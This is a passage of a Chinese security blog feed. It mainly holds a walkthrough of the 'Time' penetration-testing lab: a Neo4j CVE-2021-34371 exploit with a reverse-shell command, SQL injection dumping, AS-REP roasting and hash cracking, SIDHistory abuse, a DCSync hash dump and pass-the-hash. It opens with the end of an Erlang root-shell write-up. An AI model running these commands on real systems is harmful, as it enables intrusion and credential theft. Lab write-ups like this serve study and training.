class="hljs-title">a</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">y</span>(<span class="hljs-title">File</span>)    -- <span class="hljs-title">generate</span> <span class="hljs-title">a</span> <span class="hljs-title">Yecc</span> <span class="hljs-title">parser</span></span><br><span class="hljs-function">** <span class="hljs-title">commands</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span> <span class="hljs-title">i</span> (<span class="hljs-title">interpreter</span> <span class="hljs-title">interface</span>) **</span><br><span class="hljs-function"><span class="hljs-title">ih</span>()       -- <span class="hljs-title">print</span> <span class="hljs-title">help</span> <span class="hljs-title">for</span> <span class="hljs-title">the</span> <span class="hljs-title">i</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">true</span></span><br><span class="hljs-function">(<span class="hljs-title">ssh_runner</span>@<span class="hljs-title">soulmate</span>)2&gt;</span><br></code></pre></td></tr></table></figure><p>运行 <code>m().</code> 查看加载的模块</p><p><img src="https://img.dkdun.cn/v1/2025/12/9715edfc4918a477.png"></p><p>加载了 os 模块，<a href="https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/">OS command and code execution in Erlang and Elixir applications</a>，os 模块运行命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">(ssh_runner@soulmate)<span class="hljs-number">4</span>&gt; os:<span class="hljs-built_in">cmd</span>(&quot;id&quot;).<br>&quot;uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)\n&quot;<br></code></pre></td></tr></table></figure><p>已经是 root 了，拿 flag 顺手的事</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传 Erlang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-Time</title>
    <link href="/2025/09/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/"/>
    <url>/2025/09/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/</url>
    
    <content type="html"><![CDATA[<p>Neo4j CVE-2021-34371，sql 注入，AS-REP Roasting，SIDHistory，哈希传递</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\aWeb\fscan-main&gt;.\fscan.exe -h 39.99.151.46 -p 1-65535<br><br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="hljs-string">                     fscan version: 1.8.4</span><br><span class="hljs-string">start infoscan</span><br><span class="hljs-string">39.99.151.46:22 open</span><br><span class="hljs-string">39.99.151.46:1337 open</span><br><span class="hljs-string">39.99.151.46:7474 open</span><br><span class="hljs-string">39.99.151.46:7473 open</span><br><span class="hljs-string">39.99.151.46:7687 open</span><br><span class="hljs-string">39.99.151.46:39433 open</span><br><span class="hljs-string">[*] alive ports len is: 6</span><br><span class="hljs-string">start vulscan</span><br><span class="hljs-string">[*] WebTitle http://39.99.151.46:7474  code:303 len:0      title:None 跳转url: http://39.99.151.46:7474/browser/</span><br><span class="hljs-string">[*] WebTitle http://39.99.151.46:7474/browser/ code:200 len:3279   title:Neo4j Browser</span><br><span class="hljs-string">[*] WebTitle https://39.99.151.46:7687 code:400 len:50     title:None</span><br><span class="hljs-string">[*] WebTitle https://39.99.151.46:7473 code:303 len:0      title:None 跳转url: https://39.99.151.46:7473/browser/</span><br><span class="hljs-string">[*] WebTitle https://39.99.151.46:7473/browser/ code:200 len:3279   title:Neo4j Browser</span><br><span class="hljs-string">已完成 6/6</span><br><span class="hljs-string">[*] 扫描结束,耗时: 5m37.2643762s</span><br></code></pre></td></tr></table></figure><h1 id="Neo4j-使用-CVE-2021-34371-获取-shell"><a href="#Neo4j-使用-CVE-2021-34371-获取-shell" class="headerlink" title="Neo4j 使用 CVE-2021-34371 获取 shell"></a>Neo4j 使用 CVE-2021-34371 获取 shell</h1><p>发现有 Neo4j 服务，尝试打 CVE，CVE-2021-34371，下载 <a href="https://github.com/vulhub/vulhub/tree/master/neo4j/CVE-2021-34371">CVE-2021-34371</a>，CVE 复现 <a href="https://www.cnblogs.com/Kawakaze777/p/18153842">CVE-2021-34371 Neo4j-Shell 漏洞复现</a></p><p>执行 <code>mvn install</code> 生成的 exp 文件 rhino_gadget-1.0-SNAPSHOT-fatjar.jar</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar rhino_gadget-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-fatjar.jar rmi://<span class="hljs-number">39.99.151.46:1337</span> <span class="hljs-string">&quot;bash -c &#123;echo,base64-encode(bash -i &gt;&amp; /dev/tcp/IP/1234 0&gt;&amp;1)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a2a9c1e6cf0bd259.png"></p><p>在 &#x2F;home&#x2F;neo4j 目录下拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag01</span>: flag&#123;cbedf03d-<span class="hljs-number">2</span>fa2-<span class="hljs-number">41</span>cd-aad8-<span class="hljs-number">7</span>cbe1dc6b035&#125;<br></code></pre></td></tr></table></figure><h1 id="对后台系统-sql-注入-dump-数据"><a href="#对后台系统-sql-注入-dump-数据" class="headerlink" title="对后台系统 sql 注入 dump 数据"></a>对后台系统 sql 注入 dump 数据</h1><p>发现本机 IP 为 172.22.6.36</p><p><img src="https://img.dkdun.cn/v1/2025/12/e9d79c1170001a26.png"></p><p>wget 上传 fscan 收集内网信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">./FScan_2.0.1_linux_x64 -h 172.22.6.36/24<br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="hljs-string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[1.8s]     已选择服务扫描模式</span><br><span class="hljs-string">[1.8s]     开始信息扫描</span><br><span class="hljs-string">[1.8s]     CIDR范围: 172.22.6.0-172.22.6.255</span><br><span class="hljs-string">[1.8s]     generate_ip_range_full</span><br><span class="hljs-string">[1.8s]     解析CIDR 172.22.6.36/24 -&gt; IP范围 172.22.6.0-172.22.6.255</span><br><span class="hljs-string">[1.8s]     最终有效主机数量: 256</span><br><span class="hljs-string">[1.8s]     开始主机扫描</span><br><span class="hljs-string">[1.8s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-string">[1.8s]     正在尝试无监听ICMP探测...</span><br><span class="hljs-string">[1.8s]     ICMP连接失败: dial ip4:icmp 127.0.0.1: socket: operation not permitted</span><br><span class="hljs-string">[1.8s]     当前用户权限不足,无法发送ICMP包</span><br><span class="hljs-string">[1.8s]     切换为PING方式探测...</span><br><span class="hljs-string">[1.9s] [*] 目标 172.22.6.12     存活 (ICMP)</span><br><span class="hljs-string">[4.9s] [*] 目标 172.22.6.25     存活 (ICMP)</span><br><span class="hljs-string">[4.9s] [*] 目标 172.22.6.36     存活 (ICMP)</span><br><span class="hljs-string">[5.0s] [*] 目标 172.22.6.38     存活 (ICMP)</span><br><span class="hljs-string">[7.9s]     存活主机数量: 4</span><br><span class="hljs-string">[7.9s]     有效端口数量: 233</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.36:22</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.12:445</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.12:139</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.12:389</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.12:135</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.12:88</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.36:7687</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.25:445</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.25:139</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.25:135</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.38:22</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.6.38:80</span><br><span class="hljs-string">[10.9s]     扫描完成, 发现 12 个开放端口</span><br><span class="hljs-string">[10.9s]     存活端口数量: 12</span><br><span class="hljs-string">[10.9s]     开始漏洞扫描</span><br><span class="hljs-string">[11.1s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="hljs-string">[11.1s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.6.12</span><br><span class="hljs-string">主机名: DC-PROGAME</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.6.12</span><br><span class="hljs-string">[11.1s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.6.25</span><br><span class="hljs-string">主机名: WIN2019</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.6.25</span><br><span class="hljs-string">[11.1s] [*] 网站标题 http://172.22.6.38        状态码:200 长度:1531   标题:后台登录</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.6.25     XIAORANG\WIN2019              </span><br><span class="hljs-string">[11.2s] [+] NetBios 172.22.6.12     DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[11.2s]     系统信息 172.22.6.12 [Windows Server 2016 Datacenter 14393]</span><br><span class="hljs-string">[11.4s] [*] 网站标题 https://172.22.6.36:7687  状态码:400 长度:50     标题:无标题</span><br><span class="hljs-string">[55.6s]     扫描已完成: 22/22</span><br></code></pre></td></tr></table></figure><p>得到以下信息</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.6.12</span>     DC:DC-PROGAME.xiaorang.lab  <br><span class="hljs-number">172.22.6.25</span>     XIAORANG\WIN2019   <br><span class="hljs-number">172.22.6.36</span>     本机<br><span class="hljs-number">172.22.6.38</span>web 服务<br></code></pre></td></tr></table></figure><p>先看看 172.22.6.38 主机，后台系统，存在 sql 注入</p><p><img src="https://img.dkdun.cn/v1/2025/12/36e3261e52839207.png"></p><p>直接使用 sqlmap 可以把数据 dump 下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains sqlmap -u http://172.22.6.38/index.php -data <span class="hljs-string">&quot;username=admin&amp;password=1&quot;</span> --dump --batch<br></code></pre></td></tr></table></figure><p>拿到很多数据包括 administrator 密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">Database: oa_db<br><span class="hljs-keyword">Table</span>: oa_admin<br>[<span class="hljs-number">1</span> entry]<br><span class="hljs-operator">+</span><span class="hljs-comment">----+------------------+---------------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> password         <span class="hljs-operator">|</span> username      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------------------+---------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span>  <span class="hljs-operator">|</span> bo2y8kAL3HnXUiQo <span class="hljs-operator">|</span> administrator <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------------------+---------------+</span><br><br>Database: oa_db<br><span class="hljs-keyword">Table</span>: oa_f1Agggg<br>[<span class="hljs-number">1</span> entry]<br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------------------------------------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> flag02                                     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span>  <span class="hljs-operator">|</span> flag&#123;b142f5ce<span class="hljs-operator">-</span>d9b8<span class="hljs-number">-4</span>b73<span class="hljs-number">-9012</span><span class="hljs-operator">-</span>ad75175ba029&#125; <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------------------------------------+</span><br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag02：flag&#123;b142f5ce-d9b8-<span class="hljs-number">4b73</span>-<span class="hljs-number">9012</span>-ad75175ba029&#125;<br></code></pre></td></tr></table></figure><h1 id="oa-用户名进行-AS-REP-Roasting-攻击"><a href="#oa-用户名进行-AS-REP-Roasting-攻击" class="headerlink" title="oa 用户名进行 AS-REP Roasting 攻击"></a>oa 用户名进行 AS-REP Roasting 攻击</h1><p>拿到一些 oa 用户数据</p><p><img src="https://img.dkdun.cn/v1/2025/12/ce50335a2491c662.png"></p><p>用户名尝试 AS-REP Roasting 攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains -q impacket-GetNPUsers -dc-ip 172.22.6.12  xiaorang.lab/ -usersfile usernames.txt<br></code></pre></td></tr></table></figure><p>最后拿到两个用户的 TGT 票据</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">$krb5asrep$<span class="hljs-number">23</span>$wenshao@XIAORANG.LAB:c8a8e9c4178ec417e26b8ebc6e550150$c39230f158eb73a400f9fafae5cccb38154e920c2f2375ad3d1cd7964b99a92e20b650ad24cfbdfbd2cbccbaa6b8c8ee2574f07fb5361f93846c31c4197ffe1ab4aaecf3d2df6f873f354fd9470f99ac93000c0cde54d7139f0a2048c37e9ea5398ac19ac5df758cdd58345197a82ba12add01a054ef8c9c7bc758c6716753377d7c6aeddd1d4469ccf3cfcea07aced971387583ac5c52087f17c88393b36ef6248aeb0aa3779fe3c6399fc6fd9288cc3bef37026a10675a2fe9d77d06353fbe855d6597b86f45b69822d8b143f4008c0e850a841dc22b86c4fe9a8b4d9f4d9b205bb21c0ff181c9630def6f<br><br>$krb5asrep$<span class="hljs-number">23</span>$zhangxin@XIAORANG.LAB:e66688646b49b157283973d305a76af7$aa9857d93ea5008534e9c35ba1402f31035cb17212958c78901039b65e31fe252197019c51623bd8d234c47475df303fdd197c157ac641afa8a7ef312c7ba6ebc63b56abce6ed1dc5a7b8f8cb1d8d1be7c64cf049e88210d06540aed6c1de37c4e0e6071ae9f6ba36c19c5791ea38304fd581b93f07cc8d12d00118488afa1798a96ba3c06378cf463dce86eec953c1e51704434eb3f6afc1e826273862f7b6be99a6c8e058efe74425a3a524659bcf8a1741091c8b4c3a83de577b1a9a20fac2ff327901128ea8e6552a59dd49880777927b79d81d7bcf67a423666a286016abd7dd09d8147ddd6581d64ce<br></code></pre></td></tr></table></figure><p>hashcat 爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 18200 <span class="hljs-string">&#x27;$TGT$&#x27;</span> /usr/share/wordlists/rockyou.txt --force<br></code></pre></td></tr></table></figure><p>拿到两个密文</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">wenshao<span class="hljs-variable">@XIAORANG</span>.<span class="hljs-variable constant_">LAB</span><span class="hljs-symbol">:hellokitty</span><br>zhangxin<span class="hljs-variable">@XIAORANG</span>.<span class="hljs-variable constant_">LAB</span><span class="hljs-symbol">:strawberry</span><br></code></pre></td></tr></table></figure><p>测试发现两个用户都能登录到 172.22.6.25 这台机器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# proxychains -q nxc rdp 172.22.6.0/24 -u <span class="hljs-string">&#x27;wenshao&#x27;</span> -p <span class="hljs-string">&#x27;hellokitty&#x27;</span><br>RDP         172.22.6.12     3389   DC-PROGAME       [*] Windows 10 or Windows Server 2016 Build 14393 (name:DC-PROGAME) (domain:xiaorang.lab) (nla:True)<br>RDP         172.22.6.25     3389   WIN2019          [*] Windows 10 or Windows Server 2016 Build 17763 (name:WIN2019) (domain:xiaorang.lab) (nla:True)<br>RDP         172.22.6.12     3389   DC-PROGAME       [+] xiaorang.lab\wenshao:hellokitty<br>RDP         172.22.6.25     3389   WIN2019          [+] xiaorang.lab\wenshao:hellokitty (Pwn3d!)<br><br>└─# proxychains -q nxc rdp 172.22.6.0/24 -u <span class="hljs-string">&#x27;zhangxin&#x27;</span> -p <span class="hljs-string">&#x27;strawberry&#x27;</span><br>RDP         172.22.6.12     3389   DC-PROGAME       [*] Windows 10 or Windows Server 2016 Build 14393 (name:DC-PROGAME) (domain:xiaorang.lab) (nla:True)<br>RDP         172.22.6.12     3389   DC-PROGAME       [+] xiaorang.lab\zhangxin:strawberry<br>RDP         172.22.6.25     3389   WIN2019          [*] Windows 10 or Windows Server 2016 Build 17763 (name:WIN2019) (domain:xiaorang.lab) (nla:True)<br>RDP         172.22.6.25     3389   WIN2019          [+] xiaorang.lab\zhangxin:strawberry (Pwn3d!)<br></code></pre></td></tr></table></figure><p>那么使用这两个有效用户收集域信息进行分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains bloodhound-python -u wenshao -p hellokitty -d xiaorang.lab -c all -ns 172.22.6.12 --zip --dns-tcp<br></code></pre></td></tr></table></figure><h1 id="SIDHistory-滥用"><a href="#SIDHistory-滥用" class="headerlink" title="SIDHistory 滥用"></a>SIDHistory 滥用</h1><p>分析域信息发现有一个有 SIDHistory 属性的 yuxuan 用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ef3eceab7d7915d.png"></p><p>在 help 中可以找到一些信息</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">The</span> <span class="hljs-selector-tag">user</span> <span class="hljs-selector-tag">YUXUAN</span>@<span class="hljs-selector-tag">XIAORANG</span><span class="hljs-selector-class">.LAB</span> <span class="hljs-selector-tag">has</span>, <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">its</span> <span class="hljs-selector-tag">SIDHistory</span> <span class="hljs-selector-tag">attribute</span>, <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">SID</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">user</span> <span class="hljs-selector-tag">ADMINISTRATOR</span>@<span class="hljs-selector-tag">XIAORANG</span><span class="hljs-selector-class">.LAB</span>.<br><br><span class="hljs-keyword">When</span> a kerberos ticket is created for YUXUAN<span class="hljs-variable">@XIAORANG</span>.LAB, it will include the SID for ADMINISTRATOR<span class="hljs-variable">@XIAORANG</span>.LAB, <span class="hljs-keyword">and</span> therefore grantYUXUAN<span class="hljs-variable">@XIAORANG</span>.LAB the same privileges <span class="hljs-keyword">and</span> permissions asADMINISTRATOR<span class="hljs-variable">@XIAORANG</span>.LAB.<br></code></pre></td></tr></table></figure><p>因此现在可以知道 yuxuan 用户和 Administrator 具有一样的权限，属于域管，那么只要拿下 yuxuan 用户就行了</p><p>用豌豆荚收集信息，拿到 yuxuan 用户密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/666ad31b1e7485b1.png"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">DefaultDomainName             :  <span class="hljs-type">xiaorang.lab</span><br>    DefaultUserName               :  <span class="hljs-type">yuxuan</span><br>     [<span class="hljs-number">0</span>m [<span class="hljs-number">1</span>;<span class="hljs-number">31</span>mDefaultPassword               :  <span class="hljs-type">Yuxuan7QbrgZ3L</span><br></code></pre></td></tr></table></figure><p>minikatz 抓 hash</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">lsadump::<span class="hljs-title">dcsync</span> /<span class="hljs-title">domain:xiaorang</span>.<span class="hljs-title">lab</span> /<span class="hljs-title">all</span> /<span class="hljs-title">csv</span></span><br></code></pre></td></tr></table></figure><p>拿到一些敏感 hash</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">502 </span>    krbtgt  a4206b127773884e2c7ea86cdd282d9c        <span class="hljs-number">514</span><br><span class="hljs-symbol">500 </span>    Administrator   <span class="hljs-number">04d93</span>ffd6f5f6e4490e0de23f240a5e9        <span class="hljs-number">512</span><br><span class="hljs-symbol">1000 </span>   DC-PROGAME$     a61d66fb5891854474ab0651c51bcad8        <span class="hljs-number">532480</span><br><span class="hljs-symbol">1181 </span>   WIN2019$        <span class="hljs-number">231</span>bed49e676f7ec4f3cfa9790d755c8        <span class="hljs-number">4096</span><br></code></pre></td></tr></table></figure><h1 id="利用哈希传递拿到权限"><a href="#利用哈希传递拿到权限" class="headerlink" title="利用哈希传递拿到权限"></a>利用哈希传递拿到权限</h1><p>测试发现 DC 和 WIN2019 都能 Pwn 掉</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# proxychains -q crackmapexec smb 172.22.6.0/25 -u administrator -H04d93ffd6f5f6e4490e0de23f240a5e9 -d xiaorang.lab<br>SMB         172.22.6.12     445    DC-PROGAME       [*] Windows Server 2016 Datacenter 14393 x64 (name:DC-PROGAME) (domain:xiaorang.lab) (signing:True) (SMBv1:True)<br>SMB         172.22.6.25     445    WIN2019          [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN2019) (domain:xiaorang.lab) (signing:False) (SMBv1:False)<br>SMB         172.22.6.12     445    DC-PROGAME       [+] xiaorang.lab\administrator:04d93ffd6f5f6e4490e0de23f240a5e9 (Pwn3d!)<br>SMB         172.22.6.25     445    WIN2019          [+] xiaorang.lab\administrator:04d93ffd6f5f6e4490e0de23f240a5e9 (Pwn3d!)<br></code></pre></td></tr></table></figure><p>拿到 flag3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# proxychains -q crackmapexec smb 172.22.6.25 -u administrator -H04d93ffd6f5f6e4490e0de23f240a5e9 -d xiaorang.lab -X <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br>SMB         172.22.6.25     445    WIN2019          [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN2019) (domain:xiaorang.lab) (signing:False) (SMBv1:False)<br>SMB         172.22.6.25     445    WIN2019          [+] xiaorang.lab\administrator:04d93ffd6f5f6e4490e0de23f240a5e9 (Pwn3d!)<br>SMB         172.22.6.25     445    WIN2019          [+] Executed <span class="hljs-built_in">command</span><br>SMB         172.22.6.25     445    WIN2019          flag03: flag&#123;80ce92a5-c074-4f20-946d-14706d5c3492&#125;<br>SMB         172.22.6.25     445    WIN2019<br>SMB         172.22.6.25     445    WIN2019<br>SMB         172.22.6.25     445    WIN2019          Maybe you can find something interesting on this server.<br>SMB         172.22.6.25     445    WIN2019          =======================================<br>SMB         172.22.6.25     445    WIN2019          What you may not know is that many objects <span class="hljs-keyword">in</span> this domain<br>SMB         172.22.6.25     445    WIN2019          are moved from other domains.<br></code></pre></td></tr></table></figure><p> 同样也能拿到 flag4</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# proxychains -q crackmapexec smb 172.22.6.12 -u administrator -H04d93ffd6f5f6e4490e0de23f240a5e9 -d xiaorang.lab -X <span class="hljs-string">&quot;type Users\Administrator\flag\flag04.txt&quot;</span><br>SMB         172.22.6.12     445    DC-PROGAME       [*] Windows Server 2016 Datacenter 14393 x64 (name:DC-PROGAME) (domain:xiaorang.lab) (signing:True) (SMBv1:True)<br>SMB         172.22.6.12     445    DC-PROGAME       [+] xiaorang.lab\administrator:04d93ffd6f5f6e4490e0de23f240a5e9 (Pwn3d!)<br>SMB         172.22.6.12     445    DC-PROGAME       [+] Executed <span class="hljs-built_in">command</span><br>SMB         172.22.6.12     445    DC-PROGAME       Awesome! you got the final flag.<br>SMB         172.22.6.12     445    DC-PROGAME<br>SMB         172.22.6.12     445    DC-PROGAME       ::::::::::::::::::::::::::    :::: ::::::::::<br>SMB         172.22.6.12     445    DC-PROGAME       :+:        :+:    +:+:+: :+:+:+:+:<br>SMB         172.22.6.12     445    DC-PROGAME       +:+        +:+    +:+ +:+:+ +:++:+<br>SMB         172.22.6.12     445    DC-PROGAME       +#+        +#+    +#+  +:+  +#++#++:++#<br>SMB         172.22.6.12     445    DC-PROGAME       +#+        +#+    +#+       